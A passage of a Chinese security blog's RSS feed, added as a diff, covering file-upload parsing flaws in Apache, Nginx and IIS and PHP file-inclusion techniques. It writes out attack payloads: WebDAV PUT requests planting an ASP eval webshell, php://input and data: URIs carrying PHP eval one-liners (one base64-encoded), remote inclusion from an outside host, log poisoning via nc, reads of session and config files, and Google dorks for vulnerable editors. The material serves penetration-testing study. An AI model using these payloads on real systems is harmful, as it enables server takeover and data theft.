+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：运行在cgi模式，cgi.fix_pathinfo=1&lt;/p&gt;
+&lt;p&gt;对任意文件名只要在URL后面追加上字符串&amp;rdquo;/任意文件名.php&amp;quot;就会按照php的方式去解析；&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;任意文件名/任意文件名.php
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;apache&#34;&gt;Apache&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Apache 1.x 2.x 解析漏洞&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;一个文件名为x1.x2.x3的文件，Apache会从右往左解析，直到遇到一个能解析的扩展名为止。例如test.php.a.b最后解析为test.php&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;若允许上传7z文件，可以上传shell.php.7z，apache会识别为shell.php&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/vulhub/vulhub/tree/master/httpd/apache_parsing_vulnerability&#34;&gt;&lt;strong&gt;Apache Httpd 多后缀解析漏洞&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;php&amp;lt;5.3.9&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;httpd.conf添加配置：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AddHandler application/x-httpd-php .php
+或
+AddHandler php5-script .php
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;那么，在有多个后缀的情况下，只要一个文件含有&lt;code&gt;.php&lt;/code&gt;后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Apache添加解析后缀&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;AddType 配置（一般结合.htaccess攻击）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;则文件名是test.php.jpg也会解析为php。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html&#34;&gt;Apache HTTPD 换行解析漏洞（CVE-2017-15715）&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，&lt;code&gt;1.php\x0A&lt;/code&gt;将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取文件名时不能用&lt;code&gt;$_FILES[&#39;file&#39;][&#39;name&#39;]&lt;/code&gt;，因为会自动把换行去掉？！（鸡肋）&lt;/li&gt;
+&lt;li&gt;默认的Apache配置即可利用，因为默认Apache配置就使用了&lt;code&gt;$&lt;/code&gt;。（这是为了修补旧的解析漏洞）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch \.php$&amp;gt;
+    SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Apache SSI 远程命令执行漏洞&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用&lt;code&gt;&amp;lt;!--#exec cmd=&amp;quot;id&amp;quot; --&amp;gt;&lt;/code&gt;语法执行任意命令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;nginx&#34;&gt;Nginx&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;php&amp;lt;5.3.9&lt;/strong&gt; ，因为新版php添加&lt;strong&gt;security.limit_extensions&lt;/strong&gt;，限制了可执行文件的后缀。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;php以cgi模式运行&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;原理 &lt;a href=&#34;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547&#34;&gt;CVE-2013-4547&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Nginx获取到文件路径upload/test.jpg/bb.txt/shell.php，因php后缀结尾而送往php解析；&lt;/p&gt;
+&lt;p&gt;由于php开启了路径修补（ cgi.fix_pathinfo=1)，逐层查找upload/test.jpg/bb.txt、upload/test.jpg，最后找到upload/test.jpg，以php解析该文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;www.xxxx.com/Upload/image/1.jpg/1.php
+www.xxxx.com/Upload/image/1.jpg%00.php
+www.xxxx.com/Upload/image/1.jpg/%20\0.php
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;配置不当&#34;&gt;配置不当&lt;/h2&gt;
+&lt;h3 id=&#34;iis-webdav漏洞详情&#34;&gt;IIS Webdav漏洞详情&lt;/h3&gt;
+&lt;p&gt;当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;OPTIONS  / HTTP/1.1
+Host:thief.one
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果存在PUT方法，则可以尝试写入一个txt文件。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PUT /shell.txt HTTP/1.1
+HOST:thief.one
+Content-length:30
+
+&amp;lt;%eval request(&amp;quot;nmask&amp;quot;)%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。
+通过MOVE或COPY方法改文件后缀名。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;COPY /shell.txt HTTP/1.1
+HOST:thief.one
+Destination:http://thief.one/shell.asp
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
+&lt;p&gt;上传目录禁止运行&lt;/p&gt;
+&lt;p&gt;使用白名单过滤&lt;/p&gt;
+&lt;p&gt;更新php版本&lt;/p&gt;
+&lt;h2 id=&#34;在线编辑器任意文件上传&#34;&gt;在线编辑器任意文件上传&lt;/h2&gt;
+&lt;p&gt;UEditor&lt;/p&gt;
+&lt;p&gt;eWebEditor&lt;/p&gt;
+&lt;p&gt;CKEditor&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FCK2.6.6版本上传漏洞绕过测试&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在浏览器地址栏中的测试网址后面输入：&lt;code&gt;/_whatsnew.html&lt;/code&gt; 查看版本信息。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;editor/filemanager/browser/default/connectors/test.html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;FCK2.4.2版本上传漏洞绕过测试&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;打开FCK上传点在浏览器地址栏中的测试网址后面输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;editor/filemanager/browser/default/connectors/test.html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;GoogleHacking&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;inurl:&amp;ldquo;editor/filemanager&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;intext:&amp;ldquo;Index of&amp;rdquo; site:&amp;ldquo;edu.cn&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;参考文章：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf&#34;&gt;OWASP上传攻击框架&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/vulhub/vulhub/tree/master/httpd&#34;&gt;vulhub/httpd/&lt;/a&gt;&lt;/p&gt;
+</description>
+      
+    </item>
+    
+    <item>
+      <title>文件包含漏洞</title>
+      <link>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
+      <pubDate>Sun, 19 Jan 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
+      
+        <description>&lt;h2 id=&#34;两个条件&#34;&gt;两个条件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;用户能够控制文件内容&lt;/li&gt;
+&lt;li&gt;include()等函数通过动态变量的方式引入需要包含的文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;特征函数&#34;&gt;特征函数&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;include（错误继续执行）、 require（错误后终止）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;include($_GET[&amp;#39;file&amp;#39;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;http://127.0.0.1/upload/include.php?file=http://go1f.cc/p.txt&amp;amp;=phpinfo();
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;require_once 、include_once&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;phpini&#34;&gt;php.ini&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;allow_url_include&lt;/strong&gt;    默认关闭 since php5.2&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;此选项允许有以下功能include，include_once，require，require_once使用URL的fopen封装。Whether to allow &lt;strong&gt;include/require&lt;/strong&gt; to open URLs (like http:// or ftp://) as files.&lt;/p&gt;
+&lt;p&gt;This setting requires allow_url_fopen to be on.  //需要allow_url_fopen开启才能开启&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;allow_url_fopen&lt;/strong&gt;    默认开启 since php5.2&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Whether to allow the treatment of URLs (like http:// or ftp://) as files.&lt;/p&gt;
+&lt;p&gt;限制 fopen， file_get_contents使用&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。&lt;/p&gt;
+&lt;p&gt;include会包含进入代码内，再解析执行一次。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;不能通过.htaccess修改以上两个php_flag型的配置&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.php.net/manual/en/configuration.changes.php#configuration.changes&#34;&gt;How to change configuration settings&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;allow_url_include&amp;rsquo; is a &amp;lsquo;PHP_INI_SYSTEM&amp;rsquo; directive and hence cannot be set with the mod_php5 &amp;lsquo;php_flag&amp;rsquo;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;绕过方法&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/923/&#34;&gt;PHP和SMB共享文件访问，绕过 URL 包含限制 &lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;rfi-远程文件包含&#34;&gt;RFI 远程文件包含&lt;/h2&gt;
+&lt;p&gt;http://协议&lt;/p&gt;
+&lt;h2 id=&#34;lfi--本地文件包含&#34;&gt;LFI  本地文件包含&lt;/h2&gt;
+&lt;p&gt;可以写多几次，返回上一层目录&lt;code&gt;../../../../../../&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;日志文件污染&#34;&gt;日志文件污染&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;常见目录&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;/var/log/apache2/access.log&lt;/p&gt;
+&lt;p&gt;/var/log/httpd/access.log&lt;/p&gt;
+&lt;p&gt;/var/log/nginx/access.log&lt;/p&gt;
+&lt;p&gt;​&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;污染&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;访问请求，控制UA或Referer&lt;/li&gt;
+&lt;li&gt;nc发送到80端口&lt;/li&gt;
+&lt;li&gt;直接污染一句话getshell&lt;/li&gt;
+&lt;li&gt;迂回地污染恶意代码，譬如有关读取系统敏感文件（/root/.ssh/）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;大型网站日志，踩点，观察备份时间&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Apache启用日志&lt;/strong&gt;     apache2.conf&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-conf&#34; data-lang=&#34;conf&#34;&gt;CustomLog &amp;quot;logs/access.log&amp;quot; combined
+; logfile with access, agent, and referer information
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;包含文件上传的临时文件httpsdlpacketstormsecuritynetpapersgenerallfi_with_phpinfo_assitancepdf&#34;&gt;&lt;a href=&#34;https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf&#34;&gt;包含文件上传的临时文件&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;​&lt;/p&gt;
+&lt;h3 id=&#34;包含session文件httpswwwcnblogscomoran9ep8082962html&#34;&gt;&lt;a href=&#34;https://www.cnblogs.com/Oran9e/p/8082962.html&#34;&gt;包含session文件&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;常见的php-session存放位置：&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;/tmp[/sessions]/sess_PHPSESSID&lt;/li&gt;
+&lt;li&gt;/var/lib/php5[/sessions]/sess_PHPSESSID&lt;/li&gt;
+&lt;li&gt;/var/lib/php[/sessions]/sess_PHPSESSID&lt;/li&gt;
+&lt;li&gt;C:/windows/temp[/sessions]/sess_PHPSESSID&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;读取session以登录任意账号&lt;/p&gt;
+&lt;p&gt;​&lt;/p&gt;
+&lt;h3 id=&#34;包含procselfenviron文件httpsblog51ctocompnig0s1992400182&#34;&gt;&lt;a href=&#34;https://blog.51cto.com/pnig0s1992/400182&#34;&gt;包含/proc/self/environ文件&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;/proc/self/environ  #当前正在运行的进程的环境变量列表&lt;/p&gt;
+&lt;p&gt;系统文件连接符：/proc/self/fd/&amp;hellip;&lt;/p&gt;
+&lt;p&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;伪协议&#34;&gt;伪协议&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.php.net/manual/zh/wrappers.php&#34;&gt;php支持的协议和封装协议&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;file协议&#34;&gt;file:///协议&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;file:///&amp;lt;绝对路径&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只能使用&lt;strong&gt;绝对路径&lt;/strong&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;phpfilter&#34;&gt;php://filter&lt;/h3&gt;
+&lt;p&gt;读取敏感文件、base64转换读取代码、联动图片马等等。&lt;/p&gt;
+&lt;h4 id=&#34;--对本地文件进行读写&#34;&gt;- 对本地文件进行读写&lt;/h4&gt;
+&lt;p&gt;无使用条件: allow_url_fopen/allow_url_include on/off，可使用&lt;strong&gt;相对/绝对路径&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;include.php?file=php://filter/resource=/etc/php5/apache2/php.ini
+
+#base64编码 convert.base64-encode
+include.php?file=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;更多字符操作函数&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;read=string.toupper、tolower、rot13、strip_tags&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;拓展&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/php-filter-magic.html&#34;&gt;谈一谈php://filter的妙用&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;--远程文件读取&#34;&gt;- 远程文件读取&lt;/h4&gt;
+&lt;p&gt;需要allow_url_include on 和 allow_url_fopen on&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;include.php?file=php://filter/resource=http://go1f.cc:8000/info.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phpinput&#34;&gt;php://input&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;allow_url_include on&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;post内容填写一句话，不写键值对形式&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /include.php?file=php://input HTTP/1.1
+Host: kokoisko.xyz:8001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+。。。
+。。。
+
+&amp;lt;?php @eval($_POST(a));?&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;联动菜刀&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;配置栏填写：
+&amp;lt;O&amp;gt;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&amp;lt;/O&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​&lt;/p&gt;
+&lt;p&gt;渗透境界：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;无文件 input、data&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;无进程 进程注入&lt;/p&gt;
+&lt;p&gt;无端口 icmp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;data协议&#34;&gt;data:协议&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;格式&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;data:[&amp;lt;mime type&amp;gt;][;charset=][;base64],&amp;lt;encoded data&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;使用条件&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;allow_url_fopen on&lt;/p&gt;
+&lt;p&gt;allow_url_include on&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;include.php?file=data:text/plain,&amp;lt;?php eval($_POST[a]);?&amp;gt;
+#或者base64编码
+include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phar协议&#34;&gt;phar://协议&lt;/h3&gt;
+&lt;p&gt;读取压缩包内的文件。&lt;/p&gt;
+&lt;p&gt;借助对压缩包文件的允许上传，也可以将tar/zip后缀改名为jpg等绕过后缀检测（无碍phar协议使用）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;PHP&amp;gt;=&lt;strong&gt;5.3.0&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;支持&lt;strong&gt;tar/zip&lt;/strong&gt;，相对路径/绝对路径&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;test.php?filename=phar://&amp;lt;zipfile.zip&amp;gt;[/&amp;lt;dir&amp;gt;]/&amp;lt;filename&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;zip协议&#34;&gt;zip://协议&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;相对路径、绝对路径&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;格式&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;zip://绝对路径#[&amp;lt;dirname&amp;gt;/]&amp;lt;filename.txt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;压缩包不要求zip后缀，可以修改为jpg等后缀&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;include.php?file=zip://C:/MyProgram/phpstudy_pro/WWW/shell.jpg%23a.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：#在url为截断结束符，发送url编码%23代替&lt;/p&gt;
+&lt;h3 id=&#34;类似协议&#34;&gt;类似协议&lt;/h3&gt;
+&lt;p&gt;compress.bzip2://&lt;/p&gt;
+&lt;p&gt;compress.zlib://&lt;/p&gt;
+</description>
+      
+    </item>
+    
+  </channel>
+</rss>
